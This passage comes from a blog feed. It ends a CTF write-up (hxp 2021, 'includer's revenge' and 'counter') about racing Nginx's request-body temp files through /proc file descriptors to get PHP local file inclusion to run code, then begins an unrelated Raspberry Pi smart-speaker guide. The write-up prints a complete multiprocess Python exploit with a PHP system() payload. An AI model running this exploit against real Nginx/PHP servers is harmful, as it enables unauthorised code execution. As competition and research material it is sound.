+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>client_body_buffer_size:
+Sets buffer size for reading client request body. In case the request body is larger than the buffer, the whole body or only its part is written to a temporary file. By default, buffer size is equal to two memory pages. This is 8K on x86, other 32-bit platforms, and x86-64. It is usually 16K on other 64-bit platforms.
+</code></pre></div></div>
+
+<p>Sound good doesn’t it? Testing this behavior was a little tricky since we never actually saw these files on the filesystem. This behavior can be easily explained when looking at the relevant source code in Nginx:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ngx_open_tempfile</span><span class="p">(</span><span class="n">u_char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="n">ngx_uint_t</span> <span class="n">persistent</span><span class="p">,</span> <span class="n">ngx_uint_t</span> <span class="n">access</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">ngx_fd_t</span>  <span class="n">fd</span><span class="p">;</span>
+
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">name</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_EXCL</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span>
+              <span class="n">access</span> <span class="o">?</span> <span class="n">access</span> <span class="o">:</span> <span class="mo">0600</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">persistent</span><span class="p">)</span> <span class="p">{</span>
+        <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">unlink</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">name</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As you can see, the temporary file is created, then <strong>immediately</strong> deleted! This is a hell of a race to win. Nevertheless we decided to go for it.</p>
+
+<p>The temporary file name will be a (10 digit 0-padded) sequential number that isn’t really predictable (it’s directly based on the number of previously handled buffered bodies at the time the request is processed).</p>
+
+<p>Luckily - we can use <code class="language-plaintext highlighter-rouge">/proc/&lt;nginx worker pid&gt;/fd/&lt;fd&gt;</code> to access these files through the open file descriptors of the Nginx worker processes! In order to easily test this behavior we simply generated a request that is larger than <code class="language-plaintext highlighter-rouge">16K</code> and made sure to keep the request going - sending the data byte by byte to leave the <code class="language-plaintext highlighter-rouge">fd</code> open.</p>
+
+<p>The weird thing about file descriptors in procfs is that they (in a way) behave both as symlinks and hardlinks. If a file was deleted while a process holds an open file descriptor:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">realpath()</code> will return the last path of the file with <code class="language-plaintext highlighter-rouge">" (deleted)"</code> appended to it.</li>
+  <li><code class="language-plaintext highlighter-rouge">open()</code> will return an <code class="language-plaintext highlighter-rouge">fd</code> that can be used to read the original file content.</li>
+</ul>
+
+<p>Using this method we could potentially use the Nginx file descriptor to access the temporary file and include its content (which is completely controlled by us).</p>
+
+<p>Unfortunately, PHP identifies the file descriptor as a symlink and thus attempts to resolve it’s link, as shown in the <code class="language-plaintext highlighter-rouge">php-core</code> snippet below:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">++</span><span class="p">(</span><span class="o">*</span><span class="n">ll</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">LINK_MAX</span> <span class="o">||</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">php_sys_readlink</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">MAXPATHLEN</span><span class="p">))</span> <span class="o">==</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+	<span class="p">...</span>    
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This means that PHP has to resolve the link and open the file between the creation and deletion of the temporary file by Nginx (which, as shown above, is literally 2 lines of code apart).</p>
+
+<p>So, the optimists will claim that a race is a race and it’s always exploitable (and they will be right!). Sadly, it’s not that easy.</p>
+
+<p>While attempting to exploit, we noticed that after resolving a link - PHP caches the resolution by default.</p>
+
+<p><img src="/assets/images/posts/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/1.png" alt="" /></p>
+
+<p>This is important because realistically, we will fail <em>many</em> times before winning the Nginx open + delete race. If we loop through every file descriptor number before succeeding, we are inserting the broken links to the cache and thus preventing us from accessing this file descriptor number again. When PHP resolves a link to a deleted file, it puts its path + <code class="language-plaintext highlighter-rouge">" (deleted)"</code> in the cache, and will not try to resolve it again until the TTL or the cache size has been exceeded.</p>
+
+<p>To overcome this “feature” we decided to implement a straightforward bypass. Instead of attempting to access the same path over and over (through <code class="language-plaintext highlighter-rouge">/proc/&lt;nginx worker pid&gt;/fd/&lt;fd&gt;</code>) we thought about using a simple trick to access it in countless different ways:</p>
+
+<p>If we could find multiple different paths that link to the root directory, we can use them to build unique paths to our file descriptors.</p>
+
+<p>Even though <code class="language-plaintext highlighter-rouge">/proc/&lt;some nginx worker pid&gt;/root/proc/&lt;nginx worker pid&gt;/fd/&lt;fd&gt;</code> and <code class="language-plaintext highlighter-rouge">/proc/&lt;nginx worker pid&gt;/fd/&lt;fd&gt;</code> resolve to the same path - adding the randomly generated prefixes makes the PHP realpath cache irrelevant. We use a random amount of <code class="language-plaintext highlighter-rouge">/proc/&lt;some nginx pid&gt;/root</code> and <code class="language-plaintext highlighter-rouge">/proc/&lt;some nginx pid&gt;/cwd</code> as components to build the path prefix since they all lead to <code class="language-plaintext highlighter-rouge">/</code>.</p>
+
+<p>This method is unique and is based on the underlying filesystem and operating system - making it harder to mitigate and patch.</p>
+
+<p>Equipped with these strategies we tried to retrieve the flag and after about 3~ minutes we consistently managed to <code class="language-plaintext highlighter-rouge">include_once()</code> the temporary file that contains our malicious payload in <code class="language-plaintext highlighter-rouge">includer's revenge</code>!</p>
+
+<h2 id="exploit-implementation">Exploit Implementation</h2>
+
+<p>We’ve used the following Python script to solve <code class="language-plaintext highlighter-rouge">includer's revenge</code> (and a slightly modified version for <code class="language-plaintext highlighter-rouge">counter</code>):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">threading</span>
+<span class="kn">import</span> <span class="n">multiprocessing</span>
+<span class="kn">import</span> <span class="n">threading</span>
+<span class="kn">import</span> <span class="n">random</span>
+
+<span class="n">SERVER</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://localhost:8088</span><span class="sh">"</span>
+<span class="n">NGINX_PIDS_CACHE</span> <span class="o">=</span> <span class="nf">set</span><span class="p">([</span><span class="mi">34</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">41</span><span class="p">])</span>
+<span class="c1"># Set the following to True to use the above set of PIDs instead of scanning:
+</span><span class="n">USE_NGINX_PIDS_CACHE</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="k">def</span> <span class="nf">create_requests_session</span><span class="p">():</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
+    <span class="c1"># Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead
+</span>    <span class="n">adapter</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">adapters</span><span class="p">.</span><span class="nc">HTTPAdapter</span><span class="p">(</span><span class="n">pool_connections</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span> <span class="n">pool_maxsize</span><span class="o">=</span><span class="mi">10000</span><span class="p">)</span>
+    <span class="n">session</span><span class="p">.</span><span class="nf">mount</span><span class="p">(</span><span class="sh">'</span><span class="s">http://</span><span class="sh">'</span><span class="p">,</span> <span class="n">adapter</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">session</span>
+
+<span class="k">def</span> <span class="nf">get_nginx_pids</span><span class="p">(</span><span class="n">requests_session</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">USE_NGINX_PIDS_CACHE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">NGINX_PIDS_CACHE</span>
+    <span class="n">nginx_pids</span> <span class="o">=</span> <span class="nf">set</span><span class="p">()</span>
+    <span class="c1"># Scan up to PID 200
+</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">200</span><span class="p">):</span>
+        <span class="n">cmdline</span> <span class="o">=</span> <span class="n">requests_session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">SERVER</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">/?action=read&amp;file=/proc/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">/cmdline</span><span class="sh">"</span><span class="p">).</span><span class="n">text</span>
+        <span class="k">if</span> <span class="n">cmdline</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">nginx: worker process</span><span class="sh">"</span><span class="p">):</span>
+            <span class="n">nginx_pids</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">nginx_pids</span>
+
+<span class="k">def</span> <span class="nf">send_payload</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">body_size</span><span class="o">=</span><span class="mi">1024000</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># The file path (/bla) doesn't need to exist - we simply need to upload a large body to Nginx and fail fast
+</span>        <span class="n">payload</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;?php system(</span><span class="sh">"</span><span class="s">/readflag</span><span class="sh">"</span><span class="s">); ?&gt; //</span><span class="sh">'</span>
+        <span class="n">requests_session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">SERVER</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/?action=read&amp;file=/bla</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">body_size</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">send_payload_worker</span><span class="p">(</span><span class="n">requests_session</span><span class="p">):</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="nf">send_payload</span><span class="p">(</span><span class="n">requests_session</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">send_payload_multiprocess</span><span class="p">(</span><span class="n">requests_session</span><span class="p">):</span>
+    <span class="c1"># Use all CPUs to send the payload as request body for Nginx
+</span>    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">multiprocessing</span><span class="p">.</span><span class="nf">cpu_count</span><span class="p">()):</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="nc">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">send_payload_worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,))</span>
+        <span class="n">p</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">generate_random_path_prefix</span><span class="p">(</span><span class="n">nginx_pids</span><span class="p">):</span>
+    <span class="c1"># This method creates a path from random amount of ProcFS path components. A generated path will look like /proc/&lt;nginx pid 1&gt;/cwd/proc/&lt;nginx pid 2&gt;/root/proc/&lt;nginx pid 3&gt;/root
+</span>    <span class="n">path</span> <span class="o">=</span> <span class="sh">""</span>
+    <span class="n">component_num</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">component_num</span><span class="p">):</span>
+        <span class="n">pid</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">nginx_pids</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">path</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">/proc/</span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s">/cwd</span><span class="sh">"</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">path</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">/proc/</span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s">/root</span><span class="sh">"</span>
+    <span class="k">return</span> <span class="n">path</span>
+
+<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">nginx_pid</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">nginx_pids</span><span class="p">):</span>
+    <span class="n">nginx_pid_list</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">nginx_pids</span><span class="p">)</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="nf">generate_random_path_prefix</span><span class="p">(</span><span class="n">nginx_pid_list</span><span class="p">)</span>
+        <span class="n">path</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">/proc/</span><span class="si">{</span><span class="n">nginx_pid</span><span class="si">}</span><span class="s">/fd/</span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="sh">"</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">d</span> <span class="o">=</span> <span class="n">requests_session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">SERVER</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">"</span><span class="s">/?action=include&amp;file=</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="sh">"</span><span class="p">).</span><span class="n">text</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">continue</span>
+        <span class="c1"># Flags are formatted as hxp{&lt;flag&gt;}
+</span>        <span class="k">if</span> <span class="sh">"</span><span class="s">hxp</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Found flag! </span><span class="sh">"</span><span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">read_file_worker</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">nginx_pid</span><span class="p">,</span> <span class="n">nginx_pids</span><span class="p">):</span>
+    <span class="c1"># Scan Nginx FDs between 10 - 45 in a loop. Since files and sockets keep closing - it's very common for the request body FD to open within this range
+</span>    <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">45</span><span class="p">):</span>
+        <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">read_file</span><span class="p">,</span> <span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">nginx_pid</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">nginx_pids</span><span class="p">))</span>
+        <span class="n">thread</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">read_file_multiprocess</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">nginx_pids</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">nginx_pid</span> <span class="ow">in</span> <span class="n">nginx_pids</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="nc">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read_file_worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">nginx_pid</span><span class="p">,</span> <span class="n">nginx_pids</span><span class="p">))</span>
+        <span class="n">p</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[DEBUG] Creating requests session</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">requests_session</span> <span class="o">=</span> <span class="nf">create_requests_session</span><span class="p">()</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[DEBUG] Getting Nginx pids</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">nginx_pids</span> <span class="o">=</span> <span class="nf">get_nginx_pids</span><span class="p">(</span><span class="n">requests_session</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[DEBUG] Nginx pids: </span><span class="si">{</span><span class="n">nginx_pids</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[DEBUG] Starting payload sending</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">send_payload_multiprocess</span><span class="p">(</span><span class="n">requests_session</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[DEBUG] Starting fd readers</span><span class="sh">'</span><span class="p">)</span>
+    <span class="nf">read_file_multiprocess</span><span class="p">(</span><span class="n">requests_session</span><span class="p">,</span> <span class="n">nginx_pids</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Our exploit tries to get PHP to <code class="language-plaintext highlighter-rouge">include_once()</code> Nginx’s request body temporary file before it’s deleted. In order to do that, we need to constantly create many HTTP requests with our payload as a (large) request body, as fast as possible.</p>
+
+<p>We use a <code class="language-plaintext highlighter-rouge">requests.Session</code> object with a large pool configured in order to speed up our HTTP requests and reduce the TCP handshake overhead.</p>
+
+<p>Afterwards, we loop over the processes to see which ones are Nginx workers, since we’ll need their PIDs to build the FD path leading to the request body files.</p>
+
+<p>After creating the session and retrieving the Nginx worker PIDs (if cache wasn’t used) - we run the main exploit logic in parallel by leveraging Python’s <code class="language-plaintext highlighter-rouge">multiprocessing</code> (threads might won’t be enough in this case due to GIL):</p>
+
+<ul>
+  <li>We create a subprocess per CPU (in <code class="language-plaintext highlighter-rouge">send_payload_multiprocess()</code>) and use that to constantly (<code class="language-plaintext highlighter-rouge">while True</code>) send HTTP requests with a large request body containing our PHP payload (<code class="language-plaintext highlighter-rouge">system("/runflag")</code> for these challenges). We used (nearly) 1MB payloads but anything between 16KB - 1MB should work (Nginx rejects request bodies larger than 1MB by default). The number of CPUs is crucial here since we need to create files fast enough to win the race.</li>
+  <li>We create a subprocess per Nginx worker with a thread for every FD (between 10 - 45). Each thread triggers the PHP <code class="language-plaintext highlighter-rouge">include_once()</code> for <code class="language-plaintext highlighter-rouge">/proc/&lt;nginx worker pid&gt;/fd/&lt;fd&gt;</code>, while adding a randomly-generated prefix of chained paths as described above.</li>
+</ul>
+
+<h2 id="winning-the-race">Winning the Race</h2>
+
+<p>The code in the implementation above worked pretty quickly on <code class="language-plaintext highlighter-rouge">includer's revenge</code> both locally and on the remote server. But when running against <code class="language-plaintext highlighter-rouge">counter</code> - we couldn’t get it to work remotely. The following code is taken from <code class="language-plaintext highlighter-rouge">counter</code>‘s server:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+<span class="k">include_once</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>In addition to the Nginx creation and deletion race we now have another race - we need <code class="language-plaintext highlighter-rouge">file_put_contents()</code> to write to the path before the content is in it, and <code class="language-plaintext highlighter-rouge">include_once()</code> to be executed after Nginx writes the request body into it. This made us think - what happens when <code class="language-plaintext highlighter-rouge">file_put_contents()</code> is called on the Nginx FD path after it’s deleted? When we looked into the request body directory (<code class="language-plaintext highlighter-rouge">/var/lib/nginx/body/</code>) it was full with files formatted as <code class="language-plaintext highlighter-rouge">0000001337 (deleted)</code> (the number is Nginx’s auto-incremented file format). These files filled 80% of our local Docker’s storage, but when querying the remote server (reading <code class="language-plaintext highlighter-rouge">/sys/block/sda/sda1/size</code> via PHP) we found they have much more storage than us and we should be OK 🙂</p>
+
+<p>Even though the exploit worked locally for <code class="language-plaintext highlighter-rouge">counter</code> (while filling the storage) - we couldn’t get it to work remotely, since winning the race is much less probable. Sniffing the traffic showed that there’s too much latency and packet loss at the rates we’re sending. Geo-locating the remote server showed that it’s in Germany while the exploit was running from US.</p>
+
+<p>We decided to purchase a VPS in Azure in the Germany region. Running the script there improved the Nginx PID retrieval significantly (30 seconds to 5 seconds) but the exploit still didn’t show results. Eventually, we noticed the new VPS only had 4 cores. We spent a few more $ to buy a 16-core VM in Germany, and got the flag within 5 seconds!</p>
+
+<p>The conclusion - always use money to solve your problems!</p>]]></content><author><name>Guy Lewin and Eyal Daniel</name></author><category term="ctf" /><category term="exploit" /><category term="hxp" /><category term="lfi" /><category term="nginx" /><category term="pasten" /><category term="php" /><category term="unintended" /><summary type="html"><![CDATA[In December 2021 Eyal Daniel and me (Guy Lewin) participated in hxp CTF 2021 on behalf of “pasten” group. We found an LFI exploit relying solely on PHP including a file running alongside Nginx.]]></summary></entry><entry><title type="html">Bathroom Smart Speaker using UE Boom, Raspberry Pi, Spotify and Home Assistant</title><link href="https://lewin.co.il/2021/09/16/bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant.html" rel="alternate" type="text/html" title="Bathroom Smart Speaker using UE Boom, Raspberry Pi, Spotify and Home Assistant" /><published>2021-09-16T17:27:45+00:00</published><updated>2021-09-16T17:27:45+00:00</updated><id>https://lewin.co.il/2021/09/16/bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant</id><content type="html" xml:base="https://lewin.co.il/2021/09/16/bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant.html"><![CDATA[<h2 id="goal">Goal</h2>
+
+<p>We’re going to build a smart speaker system that can play tropical forest sounds (or any other Spotify playlist) on demand from Home Assistant, and support Spotify Connect connectivity to cast music from other Spotify clients (if you want to put your own music while showering).</p>
+
+<h2 id="why">Why?</h2>
+
+<p>Who doesn’t like showering with music? And if you already put a speaker in your bathroom, why not put some tropical background sounds while you’re at it?</p>
+
+<h2 id="hardware-requirements">Hardware Requirements</h2>
+
+<p>I’m using the following hardware for my setup:</p>
+
+<ul>
+  <li><a href="https://www.ultimateears.com/en-us/wireless-speakers/boom-3.html">UE </a><a href="https://www.ultimateears.com/en-us/wireless-speakers/boom-3.html">Boom</a> (I’m actually using UE Boom 2 but any UE Boom would work).</li>
+  <li><a href="https://www.raspberrypi.org/products/raspberry-pi-zero-w/">Raspberry Pi Zero W</a> (any Raspberry Pi with Bluetooth will work. Make sure it’ll also have WiFi since most bathrooms don’t have an Ethernet port).
+    <ul>
+      <li>microSD card and power adapter for the Raspberry Pi.</li>
+    </ul>
+  </li>
+  <li>Optional: <a href="https://www.aqara.com/us/motion_sensor.html">Aqara Motion Sensor</a> + <a href="https://www.phoscon.de/en/conbee2">ConBee II</a> (if you want to turn music on / off based on motion).</li>
+</ul>
+
+<h2 id="additional-requirements">Additional Requirements</h2>
+
+<ul>
+  <li><a href="https://www.home-assistant.io/">Home Assistant</a> installation in LAN.</li>
+  <li>Spotify Premium account.</li>
+</ul>
+
+<h2 id="steps">Steps</h2>
+
+<h3 id="preparing-the-raspberry-pi">Preparing the Raspberry Pi</h3>
+
+<p>Install <a href="https://www.raspberrypi.org/software/">Raspberry Pi OS</a> on your device by using software such as <a href="https://www.raspberrypi.org/documentation/computers/getting-started.html#using-raspberry-pi-imager">Raspberry Pi Imager</a>. I chose to install the “Raspberry Pi OS with desktop” flavor.</p>
+
+<h3 id="installing-raspotify">Installing Raspotify</h3>
+
+<p>Once the RPi is installed and connected to your local network, connect via SSH and run the following command to install <a href="https://github.com/dtcooper/raspotify">Raspotify</a> - the Spotify connect server for Raspberry Pi:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Install Raspotify</span>
+curl <span class="nt">-sL</span> https://dtcooper.github.io/raspotify/install.sh | sh
+</code></pre></div></div>
+
+<p>After installation, edit <code class="language-plaintext highlighter-rouge">/etc/default/raspotify</code> to change some parameters:</p>
+
+<ul>
+  <li>Uncomment (remove the # at the beginning) the line that starts with <code class="language-plaintext highlighter-rouge">DEVICE_NAME</code> and name your Spotify connect server (e.g. <code class="language-plaintext highlighter-rouge">Bathroom Speaker</code>)</li>
+  <li>Uncomment (remove the # at the beginning) the line that starts with <code class="language-plaintext highlighter-rouge">OPTIONS</code> in order to specify your Spotify premium credentials. This is crucial to allow Home Assistant to play music on this speaker</li>
+</ul>
+
+<p>The file should look like this (<strong>while changing every <code class="language-plaintext highlighter-rouge">&lt;&gt;</code> parameter</strong>):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># /etc/default/raspotify -- Arguments/configuration for librespot
+
+# Device name on Spotify Connect
+DEVICE_NAME="&lt;Speaker Name&gt;"
+
+# The displayed device type in Spotify clients.
+# Can be "unknown", "computer", "tablet", "smartphone", "speaker", "tv",
+# "avr" (Audio/Video Receiver), "stb" (Set-Top Box), and "audiodongle".
+#DEVICE_TYPE="speaker"
+
+# Bitrate, one of 96 (low quality), 160 (default quality), or 320 (high quality)
+#BITRATE="160"
+
+# Additional command line arguments for librespot can be set below.
+# See `librespot -h` for more info. Make sure whatever arguments you specify
+# aren't already covered by other variables in this file. (See the daemon's
+# config at `/lib/systemd/system/raspotify.service` for more technical details.)
+#
+# To make your device visible on Spotify Connect across the Internet add your
+# username and password which can be set via "Set device password", on your
+# account settings, use `--username` and `--password`.
+#
+# To choose a different output device (ie a USB audio dongle or HDMI audio out),
+# use `--device` with something like `--device hw:0,1`. Your mileage may vary.
+#
+OPTIONS="--username '&lt;Put Spotify Premium Username Here&gt;' --password '&lt;Put Spotify Premium Password Here&gt;'"
+
+# Uncomment to use a cache for downloaded audio files. Cache is disabled by
+# default. It's best to leave this as-is if you want to use it, since
+# permissions are properly set on the directory `/var/cache/raspotify'.
+#CACHE_ARGS="--cache /var/cache/raspotify"
+
+# By default, the volume normalization is enabled, add alternative volume
+# arguments here if you'd like, but these should be fine.
+#VOLUME_ARGS="--enable-volume-normalisation --volume-ctrl linear --initial-volume=100"
+
+# Backend could be set to pipe here, but it's for very advanced use cases of
+# librespot, so you shouldn't need to change this under normal circumstances.
+#BACKEND_ARGS="--backend alsa"
+</code></pre></div></div>
+
+<h3 id="installing-pi-btaudio">Installing pi-btaudio</h3>
+
+<p>pi-btaudio is a suite of packages that allow your RPi to connect to UE Boom automatically, and make sure the connection stays active.</p>
+
+<p>Start by going over the <a href="https://github.com/bablokb/pi-btaudio#prerequisites">prerequisites</a>, make sure to write down the MAC address of your UE Boom. In order to connect to a UE Boom, you must press its Bluetooth pairing button for it to accept new connections.</p>
+
+<p>Once you’re done, follow <a href="https://github.com/bablokb/pi-btaudio#installation">their installation steps</a> to install the tools. Edit the configuration file in <code class="language-plaintext highlighter-rouge">/etc/asound.conf</code> with the following content (<strong>make sure you replace <code class="language-plaintext highlighter-rouge">&lt;UE Boom Bluetooth MAC&gt;</code> with the one found during prerequisites</strong>):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pcm.!default "bluealsa"
+ctl.!default "bluealsa"
+defaults.bluealsa.interface "hci0"
+defaults.bluealsa.device "&lt;UE Boom Bluetooth MAC&gt;"
+defaults.bluealsa.profile "a2dp"
+</code></pre></div></div>
+
+<h3 id="raspotify-watchdog-restarter">Raspotify Watchdog Restarter</h3>
+
+<p>Providing credentials as options to Raspotify ensures Home Assistant will be able to connect and play music remotely. But after someone else uses Spotify Connect to cast music into Raspotify - it’s unable to reconnect using the credentials provided in the configuration file.</p>
+
